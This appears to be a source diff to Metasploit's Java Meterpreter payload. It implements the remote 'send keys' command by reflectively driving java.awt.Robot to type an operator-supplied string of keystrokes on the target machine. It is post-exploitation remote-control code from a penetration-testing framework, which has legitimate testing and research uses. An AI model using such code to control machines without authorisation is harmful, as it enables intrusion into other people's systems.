@@ -5,28 +5,26 @@ import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.TLVType;
 import com.metasploit.meterpreter.command.Command;
 
-import javax.imageio.IIOImage;
-import javax.imageio.ImageIO;
-import javax.imageio.ImageWriteParam;
-import javax.imageio.ImageWriter;
-import java.awt.*;
-import java.awt.event.KeyEvent;
-import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Method;
 
 public class stdapi_ui_send_keys_V1_4 extends stdapi_ui_send_keys implements Command {
 
     public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
         String keyString = request.getStringValue(TLVType.TLV_TYPE_KEYS_SEND);
+        pressKeyString(keyString);
         return ERROR_SUCCESS;
     }
 
-    /*
-    private void pressKeyString(String keyString) throws AWTException {
-        Robot robot = new Robot();
+    private void pressKeyString(String keyString) throws Exception {
+        RobotReflect robot = new RobotReflect();
         for (int i=0;i<keyString.length();i++) {
+            int keyCode = keyString.charAt(i);
+            robot.keyPress(keyCode);
+            robot.keyRelease(keyCode);
         }
     }
 
+    /*
     private void pressUnicode(Robot r, int key_code)
     {
         r.keyPress(KeyEvent.VK_ALT);
@@ -40,5 +38,26 @@ public class stdapi_ui_send_keys_V1_4 extends stdapi_ui_send_keys implements Com
         }
         r.keyRelease(KeyEvent.VK_ALT);
     }
-    */
+ */
+
+    private static class RobotReflect {
+        Object robotObject;
+        Method keyPress;
+        Method keyRelease;
+
+        RobotReflect() throws Exception {
+            Class robotClass = Class.forName("java.awt.Robot");
+            robotObject = robotClass.newInstance();
+            keyPress = robotClass.getMethod("keyPress", int.class);
+            keyRelease = robotClass.getMethod("keyRelease", int.class);
+        }
+
+        void keyPress(int i) throws Exception {
+            keyPress.invoke(robotObject, i);
+        }
+
+        void keyRelease(int i) throws Exception {
+            keyRelease.invoke(robotObject, i);
+        }
+    }
 }
